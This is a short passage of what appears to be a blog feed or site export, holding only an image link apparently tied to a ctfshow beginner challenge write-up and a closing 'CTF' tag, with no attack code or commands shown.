+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/%24NA%24%7B4AR%7BMGLJT3%24JG~08%5DE.png" alt=""></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
